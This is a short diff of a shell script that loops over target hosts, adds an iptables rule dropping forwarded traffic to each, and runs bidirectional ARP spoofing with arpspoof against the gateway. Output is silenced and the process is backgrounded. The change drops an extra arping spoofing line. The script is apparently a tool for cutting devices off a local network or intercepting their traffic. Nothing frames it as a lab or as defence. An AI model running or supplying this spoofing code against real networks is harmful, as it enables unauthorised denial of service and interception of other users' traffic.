@@ -163,10 +163,7 @@ for TARGET in "${TARGETS[@]}"; do
     sudo iptables -A FORWARD -d "$TARGET" -j DROP
 
     # Bidirectional ARP Spoofing
-    (
-        arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 &
-        arping -b -A -i "$INTERFACE" -S "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
-    ) &
+   ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
 done
 
 echo ""
